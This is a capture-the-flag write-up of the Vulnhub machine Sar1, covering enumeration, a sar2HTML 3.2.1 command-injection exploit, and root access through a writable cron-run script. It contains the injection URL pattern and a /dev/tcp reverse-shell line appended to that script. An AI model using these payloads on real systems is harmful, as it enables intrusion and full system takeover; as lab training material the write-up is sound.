---
title: Write-up Sar1 on Vulnhub
author: eMVee
date: 2023-02-28 00:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, sar2html, cronjob]
render_with_liquid: false
---


In this post we discuss how the vulnerable machine Sar1 from [Vulnhub](https://www.vulnhub.com/entry/sar-1,425/) can be hacked This is a vulnerable machine from the famous TJnull list for preparing for the OSCP exam! 

So, let's get started and see if we can pwn this machine!

## Enumeration
We should check our own IP address and add it to our notes since we will need it for a reverse shell probably.
```bash
┌──(emvee㉿kali)-[~]
└─$ ip a                        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:c8:57:62 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.14/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 475sec preferred_lft 475sec
    inet6 fe80::a00:27ff:fec8:5762/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```
Now let's check for the IP address of our target with arp-scan.
```bash                                         
┌──(emvee㉿kali)-[~]
└─$ sudo arp-scan --localnet    
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:c8:57:62, IPv4: 10.0.2.14
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:cb:fa:02       PCS Systemtechnik GmbH
10.0.2.22       08:00:27:1c:c6:9a       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.075 seconds (123.37 hosts/sec). 4 responded

```
Almost forgotten, we should have created a project directory for this vulnerable machine. So let's create it before we start hacking our way into the machine.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents  

┌──(emvee㉿kali)-[~/Documents]
└─$ mkdir Vulnhub

┌──(emvee㉿kali)-[~/Documents]
└─$ cd Vulnhub 

┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mkdir Sar1   

┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ cd Sar1  

```
We had identified the IP address of the target, so let's assign it to a variable in the CLI.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ ip=10.0.2.22
```
A quick ping request can help us identifying the Operating System.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ ping $ip -c 3                         
PING 10.0.2.22 (10.0.2.22) 56(84) bytes of data.
64 bytes from 10.0.2.22: icmp_seq=1 ttl=64 time=2.70 ms
64 bytes from 10.0.2.22: icmp_seq=2 ttl=64 time=1.10 ms
64 bytes from 10.0.2.22: icmp_seq=3 ttl=64 time=1.28 ms

--- 10.0.2.22 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 1.096/1.693/2.704/0.718 ms
```
Based on the `ttl` value, we can assume that this machine is running on a Linux Operating System.
Now let's run a simple port scan to identify open ports.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ nmap $ip -T4 -sC
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-27 21:23 CET
Nmap scan report for 10.0.2.22
Host is up (0.00074s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Apache2 Ubuntu Default Page: It works

Nmap done: 1 IP address (1 host up) scanned in 3.40 seconds
```
It looks like there is one port open
- Port 80
    - Apache
    - Title: Apache2 Ubuntu Default Page: It works

Let's run a more advanced scan to identify versions.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ sudo nmap -sC -sV -T4 -p- $ip
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-27 21:24 CET
Nmap scan report for 10.0.2.22
Host is up (0.00028s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 08:00:27:1C:C6:9A (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.26 seconds
```

After nmap has finished scanning we can see some more information. Let's add the following to our notes:
- Linux, probably Ubuntu
- Port 80
    - Apache 2.4.29
    - Title: Apache2 Ubuntu Default Page: It works

Let's try to identify some technologies used on the webserver with whatweb.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ whatweb http://$ip
http://10.0.2.22 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.0.2.22], Title[Apache2 Ubuntu Default Page: It works]
```
A bit disappointing, w edid not discover anything useful yet. Perhaps the old Nikto can help us here.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ nikto -h $ip    
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.22
+ Target Hostname:    10.0.2.22
+ Target Port:        80
+ Start Time:         2023-02-27 21:26:40 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 59558e1434548, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2023-02-27 21:27:57 (GMT1) (77 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Well, nikto did discover something, let's keep the following in our mind:
- phpinfo.php

Before we visit this page in the browser it is a good idea to start enumerating directories on the webserver.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ dirb http://$ip

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Feb 27 21:30:44 2023
URL_BASE: http://10.0.2.22/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.2.22/ ----
+ http://10.0.2.22/index.html (CODE:200|SIZE:10918)                                                                                                                                                                                       
+ http://10.0.2.22/phpinfo.php (CODE:200|SIZE:95437)                                                                                                                                                                                      
+ http://10.0.2.22/robots.txt (CODE:200|SIZE:9)                                                                                                                                                                                           
+ http://10.0.2.22/server-status (CODE:403|SIZE:274)    
 
-----------------
END_TIME: Mon Feb 27 21:30:51 2023
DOWNLOADED: 4612 - FOUND: 4
```
Another files has been found what might be interesting. So let's write the following items to our notes:
- phpinfo.php
- robots.txt

Let's check `robots.txt`. It mighr help us identify something juicy.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ curl http://$ip/robots.txt
sar2HTML

```
Another directory has been identified. Let's check it with curl.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ curl http://$ip/sar2HTML  
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.0.2.22/sar2HTML/">here</a>.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.0.2.22 Port 80</address>
</body></html>

```
Let's check with the browser to see what it looks like since it is getting redirected.
![Image](/assets/img/WriteUp/Vulnhub/Sar1/Pasted image 20230227214638.png){: width="700" height="400" }

It looks like we can idenitfy a version of the application. We should add this to our notes.
- sar2HTML version 3.2.1

Next we should check if there are known exploits available for this application.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ searchsploit sar2html        
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution                                                                                                                                                            | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                                                                                                                                                | php/webapps/47204.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
It looks like there is a Remote Code Execution possible. Let's copy the exploit to our project directory and inspect the exploit.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ searchsploit -m 47204
  Exploit: Sar2HTML 3.2.1 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/47204
     Path: /usr/share/exploitdb/exploits/php/webapps/47204.txt
File Type: ASCII text

Copied to: /home/emvee/Documents/Vulnhub/Sar1/47204.txt

┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ cat 47204.txt           
# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Exploit Author: Furkan KAYAPINAR
# Vendor Homepage:https://github.com/cemtan/sar2html
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Centos 7

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute
the command you entered. After command injection press "select # host" then your command's
output will appear bottom side of the scroll screen.                      
```

It looks like a simple exploit. Let's try a simple command like `whoami` to see if it works.


![Image](/assets/img/WriteUp/Vulnhub/Sar1/Pasted image 20230227215242.png){: width="700" height="400" }

It looks like it works, let's try to find another exploit that can help us with a reverse shell. The search query I used is:
```
https://www.google.com/search?q=sar2html+rce
```

One of the results came back with Google is:
```
https://github.com/AssassinUKG/sar2HTML
```

After reading the exploit on the Github site I decided to git clone the exploit to my project directory.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ git clone https://github.com/AssassinUKG/sar2HTML.git
Cloning into 'sar2HTML'...
remote: Enumerating objects: 43, done.
remote: Counting objects: 100% (43/43), done.
remote: Compressing objects: 100% (40/40), done.
remote: Total 43 (delta 11), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (43/43), 149.12 KiB | 2.16 MiB/s, done.
Resolving deltas: 100% (11/11), done.

┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ cd sar2HTML  

┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1/sar2HTML]
└─$ ls
assets  README.md  sar2HTMLshell.py

```

## Initial access

Now we can try to get a reverse shell with exploit cloned from Github.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1/sar2HTML]
└─$ python3 sar2HTMLshell.py -ip $ip -rip 10.0.2.15 -pe sar2HTML
                _____  _   _ ________  ___ _     
               / __  \| | | |_   _|  \/  || | 
 ___  __ _ _ __`' / /'| |_| | | | | .  . || | 
/ __|/ _` | '__| / /  |  _  | | | | |\/| || |  
\__ \ (_| | |  ./ /___| | | | | | | |  | || |____                                                                                    
|___/\__,_|_|  \_____/\_| |_/ \_/ \_|  |_/ \_____/   

The Host Appears Vulnerable, Running a basic shell ...
Enter: 'rs session' for a ReverseShell
$\cmd> whoami
------- Results -------
www-data
$\cmd> 

```
So we can run command now, so let's get started enumerating on the victim.

```bash
$\cmd> uname -a
------- Results -------
Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

$\cmd> cat /etc/issue
------- Results -------
Ubuntu 18.04.3 LTS \n \l

$\cmd> cat /etc/passwd
------- Results -------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:112:117::/nonexistent:/bin/false
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
love:x:1000:1000:love,,,:/home/love:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false

```
It looks like there is just one user on the target. We should try to enumerate the home directory of this user.


```bash
$\cmd> ls /home -ahlR
------- Results -------
/home:
total 12K
drwxr-xr-x  3 root root 4.0K Oct 20  2019 .
drwxr-xr-x 24 root root 4.0K Oct 20  2019 ..
drwxr-xr-x 17 love love 4.0K Oct 21  2019 love

/home/love:
total 92K
drwxr-xr-x 17 love love 4.0K Oct 21  2019 .
drwxr-xr-x  3 root root 4.0K Oct 20  2019 ..
-rw-------  1 love love 3.1K Oct 21  2019 .ICEauthority
-rw-------  1 love love   48 Oct 21  2019 .bash_history
-rw-r--r--  1 love love  220 Oct 20  2019 .bash_logout
-rw-r--r--  1 love love 3.7K Oct 20  2019 .bashrc
drwx------ 13 love love 4.0K Oct 21  2019 .cache
drwx------ 13 love love 4.0K Oct 20  2019 .config
drwx------  3 root root 4.0K Oct 20  2019 .dbus
drwx------  3 love love 4.0K Oct 20  2019 .gnupg
drwx------  2 root root 4.0K Oct 20  2019 .gvfs
drwx------  3 love love 4.0K Oct 20  2019 .local
-rw-r--r--  1 love love  807 Oct 20  2019 .profile
-rw-r--r--  1 root root   66 Oct 20  2019 .selected_editor
drwx------  2 love love 4.0K Oct 20  2019 .ssh
-rw-r--r--  1 love love    0 Oct 20  2019 .sudo_as_admin_successful
drwxr-xr-x  2 love love 4.0K Oct 20  2019 Desktop
drwxr-xr-x  2 love love 4.0K Oct 20  2019 Documents
drwxr-xr-x  2 love love 4.0K Oct 20  2019 Downloads
drwxr-xr-x  2 love love 4.0K Oct 20  2019 Music
drwxr-xr-x  2 love love 4.0K Oct 21  2019 Pictures
drwxr-xr-x  2 love love 4.0K Oct 20  2019 Public
drwxr-xr-x  2 love love 4.0K Oct 20  2019 Templates
drwxr-xr-x  2 love love 4.0K Oct 20  2019 Videos

/home/love/Desktop:
total 12K
drwxr-xr-x  2 love love 4.0K Oct 20  2019 .
drwxr-xr-x 17 love love 4.0K Oct 21  2019 ..
-rw-r--r--  1 love love   33 Oct 20  2019 user.txt

/home/love/Documents:
total 8.0K
drwxr-xr-x  2 love love 4.0K Oct 20  2019 .
drwxr-xr-x 17 love love 4.0K Oct 21  2019 ..

/home/love/Downloads:
total 8.0K
drwxr-xr-x  2 love love 4.0K Oct 20  2019 .
drwxr-xr-x 17 love love 4.0K Oct 21  2019 ..

/home/love/Music:
total 8.0K
drwxr-xr-x  2 love love 4.0K Oct 20  2019 .
drwxr-xr-x 17 love love 4.0K Oct 21  2019 ..

/home/love/Pictures:
total 8.0K
drwxr-xr-x  2 love love 4.0K Oct 21  2019 .
drwxr-xr-x 17 love love 4.0K Oct 21  2019 ..

/home/love/Public:
total 8.0K
drwxr-xr-x  2 love love 4.0K Oct 20  2019 .
drwxr-xr-x 17 love love 4.0K Oct 21  2019 ..

/home/love/Templates:
total 8.0K
drwxr-xr-x  2 love love 4.0K Oct 20  2019 .
drwxr-xr-x 17 love love 4.0K Oct 21  2019 ..

/home/love/Videos:
total 8.0K
drwxr-xr-x  2 love love 4.0K Oct 20  2019 .
drwxr-xr-x 17 love love 4.0K Oct 21  2019 ..
$\cmd> 

```

Probably not intended, but it is possible to read the user flag as www-data.
So let's capture the user flag.
```bash
$\cmd> cat //home/love/Desktop/user.txt
------- Results -------
427a7e47deb4a8649c7cab38df232b52

```
Next we should check the files in the level above the current working directory.

```bash
$\cmd> ls -la ../
------- Results -------
total 40
drwxr-xr-x 3 www-data www-data  4096 Oct 21  2019 .
drwxr-xr-x 4 www-data www-data  4096 Oct 21  2019 ..
-rwxr-xr-x 1 root     root        22 Oct 20  2019 finally.sh
-rw-r--r-- 1 www-data www-data 10918 Oct 20  2019 index.html
-rw-r--r-- 1 www-data www-data    21 Oct 20  2019 phpinfo.php
-rw-r--r-- 1 root     root         9 Oct 21  2019 robots.txt
drwxr-xr-x 4 www-data www-data  4096 Oct 20  2019 sar2HTML
-rwxrwxrwx 1 www-data www-data    30 Oct 21  2019 write.sh
$\cmd> 

```
There are two bash scripts in the directory.
- `finally.sh` is owned by `root` and not writeable
- `write.sh` is owned by `www-data` and writeable.

Both files are interesting, but let's inspect the first bash script what is owned by the root user.

```bash
$\cmd> cat ../finally.sh
------- Results -------
#!/bin/sh

./write.sh
$\cmd> cat ../write.sh
------- Results -------
#!/bin/sh

touch /tmp/gateway
$\cmd> 

```

The bash scripts execute `write.sh`. This file could be written by us as `www-data` user.
So let's add a reverse shell command to the `write.sh` file.


## Privilege escalation
First we should create a listener with netcat.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ nc -lvp 4321
listening on [any] 4321 ...

```
Now we should append the bash script with our reverse shell command.
```bash
$ echo 'sh -i >& /dev/tcp/10.0.2.14/4321 0>&1' >> write.sh
$ cat write.sh
#! /bin/sh
 
sh -i >& /dev/tcp/10.0.2.14/4321 0>&1

```
Now we have to wait a bit before our reverse shell is executed. So let's keep an eye on our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/Sar1]
└─$ nc -lvp 4321
listening on [any] 4321 ...
10.0.2.22: inverse host lookup failed: Unknown host
connect to [10.0.2.14] from (UNKNOWN) [10.0.2.22] 43920
sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
66f93d6b2ca96c9ad78a8a9ba0008e99
# 

```
We pwned the vulnerable machine!
